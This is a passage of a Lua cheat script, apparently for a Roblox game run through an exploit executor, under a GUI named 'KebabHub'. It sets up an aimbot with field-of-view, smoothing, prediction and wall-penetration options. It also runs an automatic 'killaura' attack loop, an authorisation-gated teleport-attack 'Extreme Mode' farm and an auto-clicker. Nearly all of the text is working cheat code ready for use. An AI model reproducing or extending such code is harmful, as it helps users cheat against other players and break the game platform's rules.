    fovRadiusLabel.BackgroundTransparency=1 fovRadiusLabel.Text="RADIUS: "..config.aimbot.fov.radius.."px"
    fovRadiusLabel.TextColor3=Color3.fromRGB(255,255,255) fovRadiusLabel.Font=Enum.Font.Gotham fovRadiusLabel.TextSize=12
    fovRadiusLabel.TextXAlignment=Enum.TextXAlignment.Center fovRadiusLabel.Parent=fovCard
    makeSlider(fovCard, 95, config.aimbot.fov.radius, 50, 500, "%d", function(val) config.aimbot.fov.radius = math.floor(val) fovRadiusLabel.Text = "RADIUS: "..config.aimbot.fov.radius.."px" updateFovCircle() end)
    fovToggle.MouseButton1Click:Connect(function() config.aimbot.fov.enabled=not config.aimbot.fov.enabled fovToggle.BackgroundColor3=config.aimbot.fov.enabled and Color3.fromRGB(80,150,80) or Color3.fromRGB(200,50,50) fovToggle.Text="FOV: "..(config.aimbot.fov.enabled and "ON" or "OFF") end)
    fovVisibleToggle.MouseButton1Click:Connect(function() config.aimbot.fov.visible=not config.aimbot.fov.visible fovVisibleToggle.BackgroundColor3=config.aimbot.fov.visible and Color3.fromRGB(80,150,80) or Color3.fromRGB(200,50,50) fovVisibleToggle.Text="VISIBLE: "..(config.aimbot.fov.visible and "ON" or "OFF") updateFovCircle() end)

    local smoothCard = createCard(aimbotContent, "SMOOTHNESS", abYPos, 95)
    abYPos = abYPos + 105
    local smoothLabel = Instance.new("TextLabel")
    smoothLabel.Size=UDim2.new(1,-30,0,25) smoothLabel.Position=UDim2.new(0,20,0,30)
    smoothLabel.BackgroundTransparency=1 smoothLabel.Text=string.format("%.2f",config.aimbot.smoothness).." (0=instant, 0.99=slow)"
    smoothLabel.TextColor3=Color3.fromRGB(255,255,255) smoothLabel.Font=Enum.Font.GothamBold smoothLabel.TextSize=12
    smoothLabel.TextWrapped=true smoothLabel.TextXAlignment=Enum.TextXAlignment.Center smoothLabel.Parent=smoothCard
    makeSlider(smoothCard, 62, config.aimbot.smoothness, 0, 0.99, "%.2f", function(val) config.aimbot.smoothness = math.round(val*100)/100 smoothLabel.Text = string.format("%.2f",config.aimbot.smoothness).." (0=instant, 0.99=slow)" end)

    local predCard = createCard(aimbotContent, "PREDICTION", abYPos, 130)
    abYPos = abYPos + 140
    local predToggle = Instance.new("TextButton")
    predToggle.Size=UDim2.new(0.45,-5,0,35) predToggle.Position=UDim2.new(0,20,0,30)
    predToggle.BackgroundColor3=config.aimbot.prediction.enabled and Color3.fromRGB(80,150,80) or Color3.fromRGB(200,50,50)
    predToggle.Text="PREDICT: "..(config.aimbot.prediction.enabled and "ON" or "OFF")
    predToggle.TextColor3=Color3.fromRGB(255,255,255) predToggle.Font=Enum.Font.GothamBold predToggle.TextSize=12 predToggle.BorderSizePixel=0
    predToggle.Parent=predCard Instance.new("UICorner",predToggle).CornerRadius=UDim.new(0,8)
    local predFactorLabel = Instance.new("TextLabel")
    predFactorLabel.Size=UDim2.new(0.45,-5,0,35) predFactorLabel.Position=UDim2.new(0.55,0,0,30)
    predFactorLabel.BackgroundColor3=Color3.fromRGB(45,30,55) predFactorLabel.Text="FACTOR: "..string.format("%.2f",config.aimbot.prediction.factor)
    predFactorLabel.TextColor3=Color3.fromRGB(255,255,255) predFactorLabel.Font=Enum.Font.GothamBold predFactorLabel.TextSize=12 predFactorLabel.BorderSizePixel=0
    predFactorLabel.Parent=predCard Instance.new("UICorner",predFactorLabel).CornerRadius=UDim.new(0,8)
    local predMaxLabel = Instance.new("TextLabel")
    predMaxLabel.Size=UDim2.new(1,-30,0,20) predMaxLabel.Position=UDim2.new(0,20,0,70)
    predMaxLabel.BackgroundTransparency=1 predMaxLabel.Text="MAX: "..config.aimbot.prediction.maxPrediction.." studs"
    predMaxLabel.TextColor3=Color3.fromRGB(200,180,255) predMaxLabel.Font=Enum.Font.Gotham predMaxLabel.TextSize=11
    predMaxLabel.TextXAlignment=Enum.TextXAlignment.Left predMaxLabel.Parent=predCard
    makeSlider(predCard, 75, config.aimbot.prediction.factor, 0, 1, "%.2f", function(val) config.aimbot.prediction.factor=math.round(val*100)/100 predFactorLabel.Text="FACTOR: "..string.format("%.2f",config.aimbot.prediction.factor) end)
    makeSlider(predCard, 105, config.aimbot.prediction.maxPrediction, 2, 20, "%d", function(val) config.aimbot.prediction.maxPrediction=math.floor(val) predMaxLabel.Text="MAX: "..config.aimbot.prediction.maxPrediction.." studs" end)
    predToggle.MouseButton1Click:Connect(function() config.aimbot.prediction.enabled=not config.aimbot.prediction.enabled predToggle.BackgroundColor3=config.aimbot.prediction.enabled and Color3.fromRGB(80,150,80) or Color3.fromRGB(200,50,50) predToggle.Text="PREDICT: "..(config.aimbot.prediction.enabled and "ON" or "OFF") end)

    local abTargetCard = createCard(aimbotContent, "TARGETS", abYPos)
    abYPos = abYPos + 95
    local abNpcToggle = Instance.new("TextButton")
    abNpcToggle.Size=UDim2.new(0.45,-5,0,40) abNpcToggle.Position=UDim2.new(0,20,0,30)
    abNpcToggle.BackgroundColor3=Color3.fromRGB(80,150,80) abNpcToggle.Text="NPCS: ON"
    abNpcToggle.TextColor3=Color3.fromRGB(255,255,255) abNpcToggle.Font=Enum.Font.GothamBold abNpcToggle.TextSize=13 abNpcToggle.BorderSizePixel=0
    abNpcToggle.Parent=abTargetCard Instance.new("UICorner",abNpcToggle).CornerRadius=UDim.new(0,10)
    local abPlayerToggle = Instance.new("TextButton")
    abPlayerToggle.Size=UDim2.new(0.45,-5,0,40) abPlayerToggle.Position=UDim2.new(0.55,0,0,30)
    abPlayerToggle.BackgroundColor3=Color3.fromRGB(200,50,50) abPlayerToggle.Text="PLAYERS: OFF"
    abPlayerToggle.TextColor3=Color3.fromRGB(255,255,255) abPlayerToggle.Font=Enum.Font.GothamBold abPlayerToggle.TextSize=13 abPlayerToggle.BorderSizePixel=0
    abPlayerToggle.Parent=abTargetCard Instance.new("UICorner",abPlayerToggle).CornerRadius=UDim.new(0,10)
    abNpcToggle.MouseButton1Click:Connect(function() config.aimbot.targetNPCs=not config.aimbot.targetNPCs abNpcToggle.BackgroundColor3=config.aimbot.targetNPCs and Color3.fromRGB(80,150,80) or Color3.fromRGB(200,50,50) abNpcToggle.Text="NPCS: "..(config.aimbot.targetNPCs and "ON" or "OFF") end)
    abPlayerToggle.MouseButton1Click:Connect(function() config.aimbot.targetPlayers=not config.aimbot.targetPlayers abPlayerToggle.BackgroundColor3=config.aimbot.targetPlayers and Color3.fromRGB(80,150,80) or Color3.fromRGB(200,50,50) abPlayerToggle.Text="PLAYERS: "..(config.aimbot.targetPlayers and "ON" or "OFF") end)

    local wallbangCard = createCard(aimbotContent, "WALLBANG", abYPos)
    abYPos = abYPos + 95
    local wallbangToggle = Instance.new("TextButton")
    wallbangToggle.Size=UDim2.new(1,-30,0,40) wallbangToggle.Position=UDim2.new(0,20,0,30)
    wallbangToggle.BackgroundColor3=Color3.fromRGB(200,50,50) wallbangToggle.Text="WALLBANG: OFF"
    wallbangToggle.TextColor3=Color3.fromRGB(255,255,255) wallbangToggle.Font=Enum.Font.GothamBold wallbangToggle.TextSize=13 wallbangToggle.BorderSizePixel=0
    wallbangToggle.Parent=wallbangCard Instance.new("UICorner",wallbangToggle).CornerRadius=UDim.new(0,10)
    wallbangToggle.MouseButton1Click:Connect(function() config.aimbot.wallbang=not config.aimbot.wallbang wallbangToggle.BackgroundColor3=config.aimbot.wallbang and Color3.fromRGB(80,150,80) or Color3.fromRGB(200,50,50) wallbangToggle.Text="WALLBANG: "..(config.aimbot.wallbang and "ON" or "OFF") end)

    local abStatusCard = createCard(aimbotContent, "STATUS", abYPos, 95)
    abYPos = abYPos + 105
    local abStatusLbl = Instance.new("TextLabel")
    abStatusLbl.Size=UDim2.new(1,-30,0,50) abStatusLbl.Position=UDim2.new(0,20,0,30)
    abStatusLbl.BackgroundColor3=Color3.fromRGB(25,15,30) abStatusLbl.BackgroundTransparency=0.5
    abStatusLbl.Text="Status: Disabled\nTarget: None"
    abStatusLbl.TextColor3=Color3.fromRGB(200,180,255) abStatusLbl.Font=Enum.Font.Gotham abStatusLbl.TextSize=12 abStatusLbl.BorderSizePixel=0
    abStatusLbl.Parent=abStatusCard Instance.new("UICorner",abStatusLbl).CornerRadius=UDim.new(0,10)

    local miscYPos = 0
    local miscMainCard = createCard(miscContent, "MISC CONTROLS", miscYPos, 140)
    miscYPos = miscYPos + 150
    local antiFlashbangToggle = Instance.new("TextButton")
    antiFlashbangToggle.Size=UDim2.new(1,-30,0,45) antiFlashbangToggle.Position=UDim2.new(0,20,0,30)
    antiFlashbangToggle.BackgroundColor3=Color3.fromRGB(200,50,50) antiFlashbangToggle.Text="ANTI-FLASHBANG: OFF"
    antiFlashbangToggle.TextColor3=Color3.fromRGB(255,255,255) antiFlashbangToggle.Font=Enum.Font.GothamBold antiFlashbangToggle.TextSize=14 antiFlashbangToggle.BorderSizePixel=0
    antiFlashbangToggle.Parent=miscMainCard Instance.new("UICorner",antiFlashbangToggle).CornerRadius=UDim.new(0,12)
    antiFlashbangToggle.MouseButton1Click:Connect(function()
        antiFlashbangEnabled=not antiFlashbangEnabled
        toggleAntiFlashbang(antiFlashbangEnabled)
        antiFlashbangToggle.BackgroundColor3=antiFlashbangEnabled and Color3.fromRGB(80,150,80) or Color3.fromRGB(200,50,50)
        antiFlashbangToggle.Text="ANTI-FLASHBANG: "..(antiFlashbangEnabled and "ON" or "OFF")
    end)

    local updateExtremeModeDisplayInner = function()
        if ExtremeMode.authorized then
            disabledOverlayInner.Visible=false
            extremeBtnInner.BackgroundColor3=Color3.fromRGB(200,50,50)
            extremeBtnInner.TextColor3=Color3.fromRGB(255,255,255)
            extremeBtnInner.Text="TFE FARM"
            extremeBtnInner.AutoButtonColor=true
        else
            disabledOverlayInner.Visible=true
            extremeBtnInner.BackgroundColor3=Color3.fromRGB(80,50,90)
            extremeBtnInner.TextColor3=Color3.fromRGB(150,150,150)
            extremeBtnInner.Text="EXTREME MODE"
            extremeBtnInner.AutoButtonColor=false
        end
    end
end

kaStatusLabel, abStatusLabel, extremeBtn, extremeStatus, disabledOverlay, updateExtremeModeDisplay = createGUI()

player.CharacterAdded:Connect(function(newChar)
    character = newChar
    humanoidRootPart = character:WaitForChild("HumanoidRootPart")
    head = character:WaitForChild("Head")
    state.cachedTargets = {}
    state.currentAimbotTarget = nil
    if state.highlightObject then state.highlightObject:Destroy() state.highlightObject = nil end
    cacheFolders()
end)

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    if input.KeyCode == config.killaura.keybind then
        config.killaura.enabled = not config.killaura.enabled
        state.cachedTargets = {} state.attackSuccessCount = 0 state.attackFailCount = 0
        updateGUIFromKeybinds()
        if config.killaura.enabled then cacheFolders() end
    elseif input.KeyCode == config.aimbot.keybind then
        config.aimbot.enabled = not config.aimbot.enabled
        if not config.aimbot.enabled then state.currentAimbotTarget = nil if state.highlightObject then state.highlightObject:Destroy() state.highlightObject = nil end
        else createFovCircle() end
        updateGUIFromKeybinds()
    elseif input.KeyCode == Enum.KeyCode.M then
        local gui = player.PlayerGui:FindFirstChild("KebabHub")
        if gui then ExtremeMode.guiVisible = not ExtremeMode.guiVisible gui.Enabled = ExtremeMode.guiVisible end
    end
end)

task.spawn(function()
    while true do
        task.wait(5)
        if getgenv().ExtremeModeAuth and getgenv().ExtremeModeAuth.authorized then
            local authData = getgenv().ExtremeModeAuth
            if not authorizationMemory.extremeModeAuthorized then
                authorizeExtremeMode(authData.authType or "UNKNOWN", authData.permanent or false, authData.timeout or 1800)
                if updateExtremeModeDisplay then updateExtremeModeDisplay() end
            end
        end
        checkExtremeModeAuth()
        if updateExtremeModeDisplay then updateExtremeModeDisplay() end
    end
end)

RunService.Heartbeat:Connect(function()
    local currentTime = tick()
    if config.killaura.enabled then
        if currentTime - state.lastAttackTime >= config.killaura.attackDelay then
            local targets = getTargets(true)
            if #targets > 0 then attackTarget(targets[1]) state.lastAttackTime = currentTime end
            if currentTime - state.lastStatusUpdate >= state.statusUpdateInterval then
                local sr = (state.attackSuccessCount + state.attackFailCount > 0) and math.floor(state.attackSuccessCount/(state.attackSuccessCount+state.attackFailCount)*100) or 0
                if kaStatusLabel and kaStatusLabel.Parent then
                    kaStatusLabel.Text = #targets > 0 and ("Status: Attacking!\nTargets: "..#targets.." | Success: "..state.attackSuccessCount.." | Fail: "..state.attackFailCount.." ("..sr.."%)") or ("Status: No targets\nTargets: 0 | Success: "..state.attackSuccessCount.." | Fail: "..state.attackFailCount)
                end
                state.lastStatusUpdate = currentTime
            end
        end
    else
        if currentTime - state.lastStatusUpdate >= state.statusUpdateInterval then
            if kaStatusLabel and kaStatusLabel.Parent then kaStatusLabel.Text = "Status: Disabled\nTargets: 0 | Success: 0 | Fail: 0" end
            state.lastStatusUpdate = currentTime
        end
    end

    if config.aimbot.enabled and currentTime - state.lastAimbotUpdate >= config.aimbot.updateInterval then
        updateAimbot()
        state.lastAimbotUpdate = currentTime
        if currentTime - state.lastStatusUpdate >= state.statusUpdateInterval then
            if abStatusLabel and abStatusLabel.Parent then
                abStatusLabel.Text = state.currentAimbotTarget and ("Status: Locked! ["..config.aimbot.lockPart.."]\nTarget: "..(state.currentAimbotTarget.model and state.currentAimbotTarget.model.Name or "Unknown")) or "Status: Searching...\nTarget: None"
            end
            state.lastStatusUpdate = currentTime
        end
    elseif not config.aimbot.enabled then
        if currentTime - state.lastStatusUpdate >= state.statusUpdateInterval then
            if abStatusLabel and abStatusLabel.Parent then abStatusLabel.Text = "Status: Disabled\nTarget: None" end
            state.lastStatusUpdate = currentTime
        end
    end

    if ExtremeMode.enabled and ExtremeMode.authorized then extremeModeTeleportAttack() end
end)

if updateExtremeModeDisplay then updateExtremeModeDisplay() end

task.wait(1)
createFovCircle()
startExtremeAutoClicker()
